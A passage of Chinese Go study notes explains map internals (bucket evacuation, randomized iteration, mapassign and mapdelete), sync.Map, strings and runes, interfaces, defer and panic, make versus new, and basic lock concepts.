当然，Go 做得更绝，当我们在遍历 map 时，并不是固定地从 0 号 bucket 开始遍历，每次都是从一个随机值序号的 bucket 开始遍历，并且是从这个 bucket 的一个随机序号的 cell 开始遍历。这样，即使你是一个写死的 map，仅仅只是遍历它，也不太可能会返回一个固定序列的 key/value 对了。

多说一句，“迭代 map 的结果是无序的”这个特性是从 go 1.0 开始加入的。

再明确一个问题：如果扩容后，B 增加了 1，意味着 buckets 总数是原来的 2 倍，原来 1 号的桶“裂变”到两个桶。

例如，原始 B = 2，1号 bucket 中有 2 个 key 的哈希值低 3 位分别为：010，110。由于原来 B = 2，所以低 2 位 `10` 决定它们落在 2 号桶，现在 B 变成 3，所以 `010`、`110` 分别落入 2、6 号桶。

<img src="https://golang.design/go-questions/map/assets/13.png" alt="bucket split" style="zoom:25%;" />

理解了这个，后面讲 map 迭代的时候会用到。

再来讲搬迁函数中的几个关键点：

evacuate 函数每次只完成一个 bucket 的搬迁工作，因此要遍历完此 bucket 的所有的 cell，将有值的 cell copy 到新的地方。bucket 还会链接 overflow bucket，它们同样需要搬迁。因此会有 2 层循环，外层遍历 bucket 和 overflow bucket，内层遍历 bucket 的所有 cell。这样的循环在 map 的源码里到处都是，要理解透了。

源码里提到 X, Y part，其实就是我们说的如果是扩容到原来的 2 倍，桶的数量是原来的 2 倍，前一半桶被称为 X part，后一半桶被称为 Y part。一个 bucket 中的 key 可能会分裂落到 2 个桶，一个位于 X part，一个位于 Y part。所以在搬迁一个 cell 之前，需要知道这个 cell 中的 key 是落到哪个 Part。很简单，重新计算 cell 中 key 的 hash，并向前“多看”一位，决定落入哪个 Part，这个前面也说得很详细了。

有一个特殊情况是：有一种 key，每次对它计算 hash，得到的结果都不一样。这个 key 就是 `math.NaN()` 的结果，它的含义是 `not a number`，类型是 float64。当它作为 map 的 key，在搬迁的时候，会遇到一个问题：再次计算它的哈希值和它当初插入 map 时的计算出来的哈希值不一样！

你可能想到了，这样带来的一个后果是，这个 key 是永远不会被 Get 操作获取的！当我使用 `m[math.NaN()]` 语句的时候，是查不出来结果的。这个 key 只有在遍历整个 map 的时候，才有机会现身。所以，可以向一个 map 插入任意数量的 `math.NaN()` 作为 key。

当搬迁碰到 `math.NaN()` 的 key 时，只通过 tophash 的最低位决定分配到 X part 还是 Y part（如果扩容后是原来 buckets 数量的 2 倍）。如果 tophash 的最低位是 0 ，分配到 X part；如果是 1 ，则分配到 Y part。

这是通过 tophash 值与新算出来的哈希值进行运算得到的：

```
if top&1 != 0 {
    // top hash 最低位为 1
    // 新算出来的 hash 值的 B 位置 1
    hash |= newbit
} else {
    // 新算出来的 hash 值的 B 位置 0
    hash &^= newbit
}

// hash 值的 B 位为 0，则搬迁到 x part
// 当 B = 5时，newbit = 32，二进制低 6 位为 10 0000
useX = hash&newbit == 0
```

其实这样的 key 我随便搬迁到哪个 bucket 都行，当然，还是要搬迁到上面裂变那张图中的两个 bucket 中去。但这样做是有好处的，在后面讲 map 迭代的时候会再详细解释，暂时知道是这样分配的就行。

确定了要搬迁到的目标 bucket 后，搬迁操作就比较好进行了。将源 key/value 值 copy 到目的地相应的位置。

设置 key 在原始 buckets 的 tophash 为 `evacuatedX` 或是 `evacuatedY`，表示已经搬迁到了新 map 的 x part 或是 y part。新 map 的 tophash 则正常取 key 哈希值的高 8 位。

下面通过图来宏观地看一下扩容前后的变化。

扩容前，B = 2，共有 4 个 buckets，lowbits 表示 hash 值的低位。假设我们不关注其他 buckets 情况，专注在 2 号 bucket。并且假设 overflow 太多，触发了等量扩容（对应于前面的条件 2）。

<img src="https://golang.design/go-questions/map/assets/14.png" alt="扩容前" style="zoom:25%;" />

扩容完成后，overflow bucket 消失了，key 都集中到了一个 bucket，更为紧凑了，提高了查找的效率。

<img src="https://golang.design/go-questions/map/assets/15.png" alt="same size 扩容" style="zoom:25%;" />

假设触发了 2 倍的扩容，那么扩容完成后，老 buckets 中的 key 分裂到了 2 个 新的 bucket。一个在 x part，一个在 y 的 part。依据是 hash 的 lowbits。新 map 中 `0-3` 称为 x part，`4-7` 称为 y part。

<img src="https://golang.design/go-questions/map/assets/16.png" alt="2倍扩容" style="zoom:25%;" />

注意，上面的两张图忽略了其他 buckets 的搬迁情况，表示所有的 bucket 都搬迁完毕后的情形。实际上，我们知道，搬迁是一个“渐进”的过程，并不会一下子就全部搬迁完毕。所以在搬迁过程中，oldbuckets 指针还会指向原来老的 []bmap，并且已经搬迁完毕的 key 的 tophash 值会是一个状态值，表示 key 的搬迁去向。

#### map 的遍历

本来 map 的遍历过程比较简单：遍历所有的 bucket 以及它后面挂的 overflow bucket，然后挨个遍历 bucket 中的所有 cell。每个 bucket 中包含 8 个 cell，从有 key 的 cell 中取出 key 和 value，这个过程就完成了。

但是，现实并没有这么简单。还记得前面讲过的扩容过程吗？扩容过程不是一个原子的操作，它每次最多只搬运 2 个 bucket，所以如果触发了扩容操作，那么在很长时间里，map 的状态都是处于一个中间态：有些 bucket 已经搬迁到新家，而有些 bucket 还待在老地方。

因此，遍历如果发生在扩容的过程中，就会涉及到遍历新老 bucket 的过程，这是难点所在。

我先写一个简单的代码样例，假装不知道遍历过程具体调用的是什么函数：

```
package main

import "fmt"

func main() {
    ageMp := make(map[string]int)
    ageMp["qcrao"] = 18

    for name, age := range ageMp {
        fmt.Println(name, age)
    }
}
```

执行命令：

```
go tool compile -S main.go
```

得到汇编命令。这里就不逐行讲解了，可以去看之前的几篇文章，说得很详细。

关键的几行汇编代码如下：

```
// ......
0x0124 00292 (test16.go:9)      CALL    runtime.mapiterinit(SB)

// ......
0x01fb 00507 (test16.go:9)      CALL    runtime.mapiternext(SB)
0x0200 00512 (test16.go:9)      MOVQ    ""..autotmp_4+160(SP), AX
0x0208 00520 (test16.go:9)      TESTQ   AX, AX
0x020b 00523 (test16.go:9)      JNE     302

// ......
```

这样，关于 map 迭代，底层的函数调用关系一目了然。先是调用 `mapiterinit` 函数初始化迭代器，然后循环调用 `mapiternext` 函数进行 map 迭代。

![map iter loop](https://static.studygolang.com/200903/a0344cd6ddd768b82e6a5323080800a4.png)

迭代器的结构体定义：

```
type hiter struct {
    // key 指针
    key         unsafe.Pointer
    // value 指针
    value       unsafe.Pointer
    // map 类型，包含如 key size 大小等
    t           *maptype
    // map header
    h           *hmap
    // 初始化时指向的 bucket
    buckets     unsafe.Pointer
    // 当前遍历到的 bmap
    bptr        *bmap
    overflow    [2]*[]*bmap
    // 起始遍历的 bucet 编号
    startBucket uintptr
    // 遍历开始时 cell 的编号（每个 bucket 中有 8 个 cell）
    offset      uint8
    // 是否从头遍历了
    wrapped     bool
    // B 的大小
    B           uint8
    // 指示当前 cell 序号
    i           uint8
    // 指向当前的 bucket
    bucket      uintptr
    // 因为扩容，需要检查的 bucket
    checkBucket uintptr
}
```

`mapiterinit` 就是对 hiter 结构体里的字段进行初始化赋值操作。

前面已经提到过，即使是对一个写死的 map 进行遍历，每次出来的结果也是无序的。下面我们就可以近距离地观察他们的实现了。

```
// 生成随机数 r
r := uintptr(fastrand())
if h.B > 31-bucketCntBits {
    r += uintptr(fastrand()) << 31
}

// 从哪个 bucket 开始遍历
it.startBucket = r & (uintptr(1)<<h.B - 1)
// 从 bucket 的哪个 cell 开始遍历
it.offset = uint8(r >> h.B & (bucketCnt - 1))
```

例如，B = 2，那 `uintptr(1)<<h.B - 1` 结果就是 3，低 8 位为 `0000 0011`，将 r 与之相与，就可以得到一个 `0~3` 的 bucket 序号；bucketCnt - 1 等于 7，低 8 位为 `0000 0111`，将 r 右移 2 位后，与 7 相与，就可以得到一个 `0~7` 号的 cell。

于是，在 `mapiternext` 函数中就会从 it.startBucket 的 it.offset 号的 cell 开始遍历，取出其中的 key 和 value，直到又回到起点 bucket，完成遍历过程。

源码部分比较好看懂，尤其是理解了前面注释的几段代码后，再看这部分代码就没什么压力了。所以，接下来，我将通过图形化的方式讲解整个遍历过程，希望能够清晰易懂。

假设我们有下图所示的一个 map，起始时 B = 1，有两个 bucket，后来触发了扩容（这里不要深究扩容条件，只是一个设定），B 变成 2。并且， 1 号 bucket 中的内容搬迁到了新的 bucket，`1 号`裂变成 `1 号`和 `3 号`；`0 号` bucket 暂未搬迁。老的 bucket 挂在在 `*oldbuckets` 指针上面，新的 bucket 则挂在 `*buckets` 指针上面。

![map origin](https://static.studygolang.com/200903/89da854e74617938bb6bc1a0b278efca.png)

这时，我们对此 map 进行遍历。假设经过初始化后，startBucket = 3，offset = 2。于是，遍历的起点将是 3 号 bucket 的 2 号 cell，下面这张图就是开始遍历时的状态：

![map init](https://static.studygolang.com/200903/848771056e8361221f38910eb8a90ac6.png)

标红的表示起始位置，bucket 遍历顺序为：3 -> 0 -> 1 -> 2。

因为 3 号 bucket 对应老的 1 号 bucket，因此先检查老 1 号 bucket 是否已经被搬迁过。判断方法就是：

```
func evacuated(b *bmap) bool {
    h := b.tophash[0]
    return h > empty && h < minTopHash
}
```

如果 b.tophash[0] 的值在标志值范围内，即在 (0,4) 区间里，说明已经被搬迁过了。

```
empty = 0
evacuatedEmpty = 1
evacuatedX = 2
evacuatedY = 3
minTopHash = 4
```

在本例中，老 1 号 bucket 已经被搬迁过了。所以它的 tophash[0] 值在 (0,4) 范围内，因此只用遍历新的 3 号 bucket。

依次遍历 3 号 bucket 的 cell，这时候会找到第一个非空的 key：元素 e。到这里，mapiternext 函数返回，这时我们的遍历结果仅有一个元素：

![iter res](https://static.studygolang.com/200903/8648dbd57d2fb87ed739743278092753.png)

由于返回的 key 不为空，所以会继续调用 mapiternext 函数。

继续从上次遍历到的地方往后遍历，从新 3 号 overflow bucket 中找到了元素 f 和 元素 g。

遍历结果集也因此壮大：

![iter res](https://static.studygolang.com/200903/21b8b12555869c923a9a229ab9239eff.png)

新 3 号 bucket 遍历完之后，回到了新 0 号 bucket。0 号 bucket 对应老的 0 号 bucket，经检查，老 0 号 bucket 并未搬迁，因此对新 0 号 bucket 的遍历就改为遍历老 0 号 bucket。那是不是把老 0 号 bucket 中的所有 key 都取出来呢？

并没有这么简单，回忆一下，老 0 号 bucket 在搬迁后将裂变成 2 个 bucket：新 0 号、新 2 号。而我们此时正在遍历的只是新 0 号 bucket（注意，遍历都是遍历的 `*bucket` 指针，也就是所谓的新 buckets）。所以，我们只会取出老 0 号 bucket 中那些在裂变之后，分配到新 0 号 bucket 中的那些 key。

因此，`lowbits == 00` 的将进入遍历结果集：

![iter res](https://static.studygolang.com/200903/151f83a0987179b945cca731e6636be3.png)

和之前的流程一样，继续遍历新 1 号 bucket，发现老 1 号 bucket 已经搬迁，只用遍历新 1 号 bucket 中现有的元素就可以了。结果集变成：

![iter res](https://static.studygolang.com/200903/0d18292970284413e834a85ff1023082.png)

继续遍历新 2 号 bucket，它来自老 0 号 bucket，因此需要在老 0 号 bucket 中那些会裂变到新 2 号 bucket 中的 key，也就是 `lowbit == 10` 的那些 key。

这样，遍历结果集变成：

![iter res](https://static.studygolang.com/200903/4a30ce02411ce6d8ded9915f4524f815.png)

最后，继续遍历到新 3 号 bucket 时，发现所有的 bucket 都已经遍历完毕，整个迭代过程执行完毕。

顺便说一下，如果碰到 key 是 `math.NaN()` 这种的，处理方式类似。核心还是要看它被分裂后具体落入哪个 bucket。只不过只用看它 top hash 的最低位。如果 top hash 的最低位是 0 ，分配到 X part；如果是 1 ，则分配到 Y part。据此决定是否取出 key，放到遍历结果集里。

map 遍历的核心在于理解 2 倍扩容时，老 bucket 会分裂到 2 个新 bucket 中去。而遍历操作，会按照新 bucket 的序号顺序进行，碰到老 bucket 未搬迁的情况时，要在老 bucket 中找到将来要搬迁到新 bucket 来的 key。

#### map 的赋值

通过汇编语言可以看到，向 map 中插入或者修改 key，最终调用的是 `mapassign` 函数。

实际上插入或修改 key 的语法是一样的，只不过前者操作的 key 在 map 中不存在，而后者操作的 key 存在 map 中。

mapassign 有一个系列的函数，根据 key 类型的不同，编译器会将其优化为相应的“快速函数”。

key 类型

插入

uint32

mapassign_fast32(t *maptype, h *hmap, key uint32) unsafe.Pointer

uint64

mapassign_fast64(t *maptype, h *hmap, key uint64) unsafe.Pointer

string

mapassign_faststr(t *maptype, h *hmap, ky string) unsafe.Pointer

我们只用研究最一般的赋值函数 `mapassign`。

整体来看，流程非常得简单：对 key 计算 hash 值，根据 hash 值按照之前的流程，找到要赋值的位置（可能是插入新 key，也可能是更新老 key），对相应位置进行赋值。

源码大体和之前讲的类似，核心还是一个双层循环，外层遍历 bucket 和它的 overflow bucket，内层遍历整个 bucket 的各个 cell。限于篇幅，这部分代码的注释我也不展示了，有兴趣的可以去看，保证理解了这篇文章内容后，能够看懂。

我这里会针对这个过程提几点重要的。

函数首先会检查 map 的标志位 flags。如果 flags 的写标志位此时被置 1 了，说明有其他协程在执行“写”操作，进而导致程序 panic。这也说明了 map 对协程是不安全的。

通过前文我们知道扩容是渐进式的，如果 map 处在扩容的过程中，那么当 key 定位到了某个 bucket 后，需要确保这个 bucket 对应的老 bucket 完成了迁移过程。即老 bucket 里的 key 都要迁移到新的 bucket 中来（分裂到 2 个新 bucket），才能在新的 bucket 中进行插入或者更新的操作。

上面说的操作是在函数靠前的位置进行的，只有进行完了这个搬迁操作后，我们才能放心地在新 bucket 里定位 key 要安置的地址，再进行之后的操作。

现在到了定位 key 应该放置的位置了，所谓找准自己的位置很重要。准备两个指针，一个（`inserti`）指向 key 的 hash 值在 tophash 数组所处的位置，另一个(`insertk`)指向 cell 的位置（也就是 key 最终放置的地址），当然，对应 value 的位置就很容易定位出来了。这三者实际上都是关联的，在 tophash 数组中的索引位置决定了 key 在整个 bucket 中的位置（共 8 个 key），而 value 的位置需要“跨过” 8 个 key 的长度。

在循环的过程中，inserti 和 insertk 分别指向第一个找到的空闲的 cell。如果之后在 map 没有找到 key 的存在，也就是说原来 map 中没有此 key，这意味着插入新 key。那最终 key 的安置地址就是第一次发现的“空位”（tophash 是 empty）。

如果这个 bucket 的 8 个 key 都已经放置满了，那在跳出循环后，发现 inserti 和 insertk 都是空，这时候需要在 bucket 后面挂上 overflow bucket。当然，也有可能是在 overflow bucket 后面再挂上一个 overflow bucket。这就说明，太多 key hash 到了此 bucket。

在正式安置 key 之前，还要检查 map 的状态，看它是否需要进行扩容。如果满足扩容的条件，就主动触发一次扩容操作。

这之后，整个之前的查找定位 key 的过程，还得再重新走一次。因为扩容之后，key 的分布都发生了变化。

最后，会更新 map 相关的值，如果是插入新 key，map 的元素数量字段 count 值会加 1；在函数之初设置的 `hashWriting` 写标志出会清零。

另外，有一个重要的点要说一下。前面说的找到 key 的位置，进行赋值操作，实际上并不准确。我们看 `mapassign` 函数的原型就知道，函数并没有传入 value 值，所以赋值操作是什么时候执行的呢？

```
func mapassign(t *maptype, h *hmap, key unsafe.Pointer) unsafe.Pointer
```

答案还得从汇编语言中寻找。我直接揭晓答案，有兴趣可以私下去研究一下。`mapassign` 函数返回的指针就是指向的 key 所对应的 value 值位置，有了地址，就很好操作赋值了。

#### map的删除

写操作底层的执行函数是 `mapdelete`：

```
func mapdelete(t *maptype, h *hmap, key unsafe.Pointer) 
```

根据 key 类型的不同，删除操作会被优化成更具体的函数：

key 类型

删除

uint32

mapdelete_fast32(t *maptype, h *hmap, key uint32)

uint64

mapdelete_fast64(t *maptype, h *hmap, key uint64)

string

mapdelete_faststr(t *maptype, h *hmap, ky string)

当然，我们只关心 `mapdelete` 函数。它首先会检查 h.flags 标志，如果发现写标位是 1，直接 panic，因为这表明有其他协程同时在进行写操作。

计算 key 的哈希，找到落入的 bucket。检查此 map 如果正在扩容的过程中，直接触发一次搬迁操作。

删除操作同样是两层循环，核心还是找到 key 的具体位置。寻找过程都是类似的，在 bucket 中挨个 cell 寻找。

找到对应位置后，对 key 或者 value 进行“清零”操作：

```
// 对 key 清零
if t.indirectkey {
    *(*unsafe.Pointer)(k) = nil
} else {
    typedmemclr(t.key, k)
}

// 对 value 清零
if t.indirectvalue {
    *(*unsafe.Pointer)(v) = nil
} else {
    typedmemclr(t.elem, v)
}
```

最后，将 count 值减 1，将对应位置的 tophash 值置成 `Empty`。

这块源码同样比较简单，感兴起直接去看代码。

#### float可以作为map的key吗

从语法上看，是可以的。Go 语言中只要是可比较的类型都可以作为 key。除开 slice，map，functions 这几种类型，其他类型都是 OK 的。具体包括：布尔值、数字、字符串、指针、通道、接口类型、结构体、只包含上述类型的数组。这些类型的共同特征是支持 `==` 和 `!=` 操作符，`k1 == k2` 时，可认为 k1 和 k2 是同一个 key。如果是结构体，只有 hash 后的值相等以及字面值相等，才被认为是相同的 key。很多字面值相等的，hash出来的值不一定相等，比如引用。

float 型可以作为 key，但是由于精度的问题，会导致一些诡异的问题。

#### map 中的 key 为什么是无序的

map 在扩容后，会发生 key 的搬迁，原来落在同一个 bucket 中的 key，搬迁后，有些 key 就要远走高飞了（bucket 序号加上了 2^B）。而遍历的过程，就是按顺序遍历 bucket，同时按顺序遍历 bucket 中的 key。搬迁后，key 的位置发生了重大的变化，有些 key 飞上高枝，有些 key 则原地不动。这样，遍历 map 的结果就不可能按原来的顺序了。

当然，如果我就一个 hard code 的 map，我也不会向 map 进行插入删除的操作，按理说每次遍历这样的 map 都会返回一个固定顺序的 key/value 序列吧。的确是这样，但是 Go 杜绝了这种做法，因为这样会给新手程序员带来误解，以为这是一定会发生的事情，在某些情况下，可能会酿成大错。

当然，Go 做得更绝，当我们在遍历 map 时，并不是固定地从 0 号 bucket 开始遍历，每次都是从一个随机值序号的 bucket 开始遍历，并且是从这个 bucket 的一个随机序号的 cell 开始遍历。这样，即使你是一个写死的 map，仅仅只是遍历它，也不太可能会返回一个固定序列的 key/value 对了。

多说一句，“迭代 map 的结果是无序的”这个特性是从 go 1.0 开始加入的。

#### map是线程安全的吗

map 不是线程安全的。

在查找、赋值、遍历、删除的过程中都会检测写标志，一旦发现写标志置位（等于1），则直接 panic。赋值和删除函数在检测完写标志是复位之后，先将写标志位置位，才会进行之后的操作。

#### sync.Map原理

Go 的内建 `map` 是不支持并发写操作的，原因是 `map` 写操作不是并发安全的，当你尝试多个 Goroutine 操作同一个 `map`，会产生报错：`fatal error: concurrent map writes`。

因此官方另外引入了 `sync.Map` 来满足并发编程中的应用。

`sync.Map` 的实现原理可概括为：

- 通过 read 和 dirty 两个字段将读写分离，读的数据存在只读字段 read 上，将最新写入的数据则存在 dirty 字段上
- 读取时会先查询 read，不存在再查询 dirty，写入时则只写入 dirty
- 读取 read 并不需要加锁，而读或写 dirty 都需要加锁
- 另外有 misses 字段来统计 read 被穿透的次数（被穿透指需要读 dirty 的情况），超过一定次数则将 dirty 数据同步到 read 上
- 对于删除数据则直接通过标记来延迟删除

#### Go中的map如何实现顺序读取

Go中map如果要实现顺序读取的话,可以先把map中的key,通过sort包排序.

通过sort中的排序包进行对map中的key进行排序.

```go
package main

import (
    "fmt"
    "sort"
)

func main() {
    var m = map[string]int{
        "hello":         0,
        "morning":       1,
        "keke":          2,
        "jame":   		 3,
    }
    var keys []string
    for k := range m {
        keys = append(keys, k)
    }
    sort.Strings(keys)
    for _, k := range keys {
        fmt.Println("Key:", k, "Value:", m[k])
    }
}
```

#### 空map和未初始化map

可以对未初始化的map进行取值，但取出来的东西是空：

```go
var m1 map[string]string
fmt.Println(m1["1"])
```

不能对未初始化的map进行赋值，这样将会抛出一个异常：panic: assignment to entry in nil map

#### map可以一边遍历一边删除吗？

map 并不是一个线程安全的数据结构。同时读写一个 map 是未定义的行为，如果被检测到，会直接 panic。

上面说的是发生在多个协程同时读写同一个 map 的情况下。 如果在同一个协程内边遍历边删除，并不会检测到同时读写，理论上是可以这样做的。但是，遍历的结果就可能不会是相同的了，有可能结果遍历结果集中包含了删除的 key，也有可能不包含，这取决于删除 key 的时间：是在遍历到 key 所在的 bucket 时刻前或者后。

一般而言，这可以通过读写锁来解决：`sync.RWMutex`。

读之前调用 `RLock()` 函数，读完之后调用 `RUnlock()` 函数解锁；写之前调用 `Lock()` 函数，写完之后，调用 `Unlock()` 解锁。

另外，`sync.Map` 是线程安全的 map，也可以使用。

#### Go的原生map中删除元素，内存会自动释放吗？

* 如果删除的元素是值类型，如int，float，bool，string以及数组和struct，map的内存不会自动释放

* 如果删除的元素是引用类型，如指针，slice，map，chan等，map的内存会自动释放，但释放的内存是子元素应用类型的内存占用

* 将map设置为nil后，内存被回收

### 字符串

**简介**：字符串是 Go 语言中的基础数据类型，虽然字符串往往被看做一个整体，但是它实际上是一片连续的内存空间，我们也可以将它理解成一个由字符组成的数组。

**详解**：字符串底层就是一个byte数组，所以可以和[]byte类型互相转换；字符串是由byte字节组成，所以字符串的长度是byte字节的长度,byte是一个int8别名**；**rune类型用来表示utf8字符，一个rune字符由1个或多个byte组成,rune是一个int32的别名；

#### 字符串转成byte数组，会发生内存拷贝吗？

字符串转成切片，会产生拷贝。严格来说，只要是发生类型强转都会发生内存拷贝。

**如何解决？**

- `StringHeader` 是`字符串`在go的底层结构。

```
type StringHeader struct {
 Data uintptr
 Len  int
}
```

- `SliceHeader` 是`切片`在go的底层结构。

```
type SliceHeader struct {
 Data uintptr
 Len  int
 Cap  int
}
```

- 那么如果想要在底层转换二者，只需要把 `StringHeader` 的地址强转成 `SliceHeader` 就行。那么go有个很强的包叫 `unsafe` 。

- - 1.`unsafe.Pointer(&a)`方法可以得到变量`a`的地址。
  - 2.`(*reflect.StringHeader)(unsafe.Pointer(&a))` 可以把字符串a转成底层结构的形式。
  - 3.`(*[]byte)(unsafe.Pointer(&ssh))` 可以把ssh底层结构体转成byte的切片的指针。
  - 4.再通过 `*`转为指针指向的实际内容。

#### 字符串可修改吗？如何修改？

Go 语言的字符串无法直接修改每一个字符元素，只能通过重新构造新的字符串并赋值给原来的字符串变量实现。

- Go 语言的字符串是不可变的。
- 修改字符串时，可以将字符串转换为 []byte 进行修改。
- []byte 和 string 可以通过强制类型转换互转。

#### rune & byte 类型

rune是int32的别名类型，一个值就代表一个Unicode字符。
byte是uint8的别名类型，一个值就是一个ASCII码值。
rune类型的值在底层都是由一个 UTF-8 编码值来表达的。

Unicode字符，我们平时接触到的中英日文，或者复合字符，都是Unicode字符。
UTF-8 编码方案会把一个 Unicode 字符编码为一个长度在 1~4 以内的字节序列。
所以，一个rune类型值代表了1~4个长度的byte数组。

## Go接口

Go 语言中接口的实现都是隐式的。Go 语言实现接口的方式与 Java 完全不同：

- 在 Java 中：实现接口需要显式地声明接口并实现所有方法；
- 在 Go 中：实现接口的所有方法就隐式地实现了接口；

- 不能有自己的字段
- 不能定义自己的方法
- 只能声明方法，不能实现
- 可嵌入其他接口类型

### 接口的隐式实现

#### 怎么实现：

实现接口的类并不需要显式声明，只需要实现接口所有的函数就表示实现了该接口，而且类还可以拥有自己的方法。

#### 能被哪些接口实现：

接口可以被结构体实现，也可以被函数类型实现。

#### 接口被实现的条件：

接口被实现的条件一：接口的方法与实现接口的类型方法格式一致（方法名、参数类型、返回值类型一致）。
接口被实现的条件二：接口中所有方法均被实现。

### 接口赋值：

现在来解释接口是一个类型，本质是一个**指针类型**，那么什么样的值可以赋值给接口，有两种：**实现了该接口的类**或者**接口**。

**1.将对象赋值给接口**
当接口实例中保存了自定义类型的实例后，就可以直接从接口上调用它所保存的实例的方法。

**2.将接口赋值给另一个接口**

1.只要两个接口拥有相同的方法列表（与次序无关），即是两个相同的接口，可以相互赋值
2.接口赋值只需要接口A的方法列表是接口B的子集（即假设接口A中定义的所有方法，都在接口B中有定义），那么B接口的实例可以赋值给A的对象。反之不成立，即子接口B包含了父接口A，因此可以将子接口的实例赋值给父接口。
3.即子接口实例实现了子接口的所有方法，而父接口的方法列表是子接口的子集，则子接口实例自然实现了父接口的所有方法，因此可以将子接口实例赋值给父接口。

 **3.接口类型作为参数**

第一点已经说了可以将实现接口的类赋值给接口，而将接口类型作为参数很常见。这时，那些实现接口的实例都能作为接口类型参数传递给函数/方法。

### 空接口

空接口是指没有定义任何接口方法的接口。**没有定义任何接口方法，意味着Go中的任意对象都已经实现空接口(因为没方法需要实现)，只要实现接口的对象都可以被接口保存，所以任意对象都可以保存到空接口实例变量中**。

### 接口嵌套

接口可以嵌套，嵌套的内部接口将属于外部接口，内部接口的方法也将属于外部接口。

另外在类型嵌套时，如果内部类型实现了接口，那么外部类型也会自动实现接口，因为内部属性是属于外部属性的。

### 类型断言

类型断言为判断一个类型有没有实现接口。

### 多态

1、多个类型（结构体）可以实现同一个接口。 
2、一个类型（结构体）可以实现多个接口。
3、实现接口的类（结构体）可以赋值给接口。

## 反射

### 三大法则

1. 从 `interface{}` 变量可以反射出反射对象；
2. 从反射对象可以获取 `interface{}` 变量；
3. 要修改反射对象，其值必须可设置；

## Go常用关键字

### select

**简介**：`select` 是操作系统中的系统调用，我们经常会使用 `select`、`poll` 和 `epoll` 等函数构建 I/O 多路复用模型提升程序的性能。Go 语言的 `select` 与操作系统中的 `select` 比较相似。但是`select`其实和IO机制中的select一样，多路复用通道，随机选取一个进行执行，如果说**通道(channel)**实现了多个goroutine之间的同步或者通信，那么`select`则实现了多个**通道(channel)**的同步或者通信，并且select具有阻塞的特性。

**详解**：

- 每个 case 都必须是一个通信（IO 操作）
- 所有 channel 表达式都会被求值（所有被发送的表达式都会被求值）
- 如果任意某个通信可以进行，它就执行，其他被忽略。
- 如果有多个 case 都可以运行，Select 会随机公平地选出一个执行。其他不会执行。
   【示例一 实际测试不是随机的 因为不带缓冲区的channel是阻塞的】
- 如果有 default 子句，则执行该语句。
- 如果没有 default 子句，select 将阻塞，直到某个通信可以运行；Go 不会重新对 channel 或值进行求值。

### defer

1. 多个 defer 的执行顺序为“后进先出/先进后出”；
2. 所有函数在执行 RET 返回指令之前，都会先检查是否存在 defer 语句，若存在则先逆序调用 defer 语句进行收尾工作再退出返回；
3. 匿名返回值是在 return 执行时被声明，有名返回值则是在函数声明的同时被声明，因此在 defer 语句中只能访问有名返回值，而不能直接访问匿名返回值；
4. return 其实应该包含前后两个步骤：第一步是给返回值赋值（若为有名返回值则直接赋值，若为匿名返回值则先声明再赋值）；第二步是调用 RET 返回指令并传入返回值，而 RET 则会检查 defer 是否存在，若存在就先逆序插播 defer 语句，最后 RET 携带返回值退出函数；

因此，‍defer、return、返回值三者的执行顺序应该是：return最先给返回值赋值；接着 defer 开始执行一些收尾工作；最后 RET 指令携带返回值退出函数。

#### defer的作用域

1. defer 只对当前协程有效（main 可以看作是主协程）；
2. 当任意一条（主）协程发生 panic 时，会执行当前协程中 panic 之前已声明的 defer；
3. 在发生 panic 的（主）协程中，如果没有一个 defer 调用 recover()进行恢复，则会在执行完最后一个已声明的 defer 后，引发整个进程崩溃；
4. 主动调用 os.Exit(int) 退出进程时，defer 将不再被执行。

#### defer和panic

当函数遇到`panic`，defer仍然会被执行。Go会先执行所有的defer链表(该函数的所有defer)，当所有defer被执行完毕且没有`recover`时，才会进行panic。

我们可以在defer中进行recover，如果defer中包含recover，则程序将不会再进行panic。

#### defer参数陷阱

在定义defer的时候，go就需要确定defer语句的函数的参数。因此go顺序执行到defer定义的时候，会直接把defer函数的参数计算出来。

### panic和recover

- `panic` 只会触发当前 Goroutine 的 `defer`；
- `recover` 只有在 `defer` 中调用才会生效；
- `panic` 允许在 `defer` 中嵌套多次调用；

### make和new

- `make` 的作用是初始化内置的数据结构，也就是我们在前面提到的切片、哈希表和 Channel。
- `new` 的作用是根据传入的类型分配一片内存空间并返回指向这片内存空间的指针。

#### 二者异同

二者都是内存的分配（堆上），但是make只用于slice、map以及channel的初始化（非零值）；而new用于类型的内存分配，并且内存置为零。所以在我们编写程序的时候，就可以根据自己的需要很好的选择了。make返回的还是这三个引用类型本身；而new返回的是指向类型的指针。

### for range原理

通过`for range`遍历切片，首先，计算遍历次数（切片长度）；每次遍历，都会把当前遍历到的值存放到一个全局变量`index`中。

其它语法糖
另外，`for range` 不光支持切片。

## Go并发

### Go除了加mutex锁之外的安全读写共享变量的方式

Golang中Goroutine 可以通过 Channel 进行安全读写共享变量,还可以通过原子性操作进行.

### go的mutex实现原理

#### 前提知识

**悲观锁和乐观锁**

悲观锁是一种悲观思想，它总认为最坏的情况可能会出现，它认为数据很可能会被其他人所修改，不管读还是写，悲观锁在执行操作之前都先上锁。

对读对写都需要加锁导致性能低，所以悲观锁用的机会不多。但是在多写的情况下，还是有机会使用悲观锁的，因为乐观锁遇到写不一致的情况下会一直重试，会浪费更多的时间。

乐观锁的思想与悲观锁的思想相反，它总认为资源和数据不会被别人所修改，所以读取不会上锁，但是乐观锁在进行写入操作的时候会判断当前数据是否被修改过。乐观锁的实现方案主要包含CAS和版本号机制。乐观锁适用于多读的场景，可以提高吞吐量。

CAS即Compare And Swap（比较与交换），是一种有名的无锁算法。即不使用锁的情况下实现多线程之间的变量同步，也就是在没有线程被阻塞的情况下实现变量的同步，所以也叫非阻塞同步。CAS涉及三个关系：指向内存一块区域的指针V、旧值A和将要写入的新值B。CAS实现的乐观锁会带来ABA问题，同时整个乐观锁在遇到数据不一致的情况下会触发等待、重试机制，这对性能的影响较大。

版本号机制是通过一个版本号version来实现版本控制。

**自旋锁**

之前介绍的CAS就是自旋锁的一种。同一时刻只能有一个线程获取到锁，没有获取到锁的线程通常有两种处理方式：

- 一直循环等待判断该资源是否已经释放锁，这种锁叫做自旋锁，它不用将线程阻塞起来(NON-BLOCKING)；
- 把自己阻塞起来，等待重新调度请求，这种是互斥锁。

自旋锁的原理比较简单，如果持有锁的线程能在短时间内释放锁资源，那么那些等待竞争锁的线程就不需要做内核态和用户态之间的切换进入阻塞状态，它们只需要等一等(自旋)，等到持有锁的线程释放锁之后即可获取，这样就避免了用户进程和内核切换的消耗。

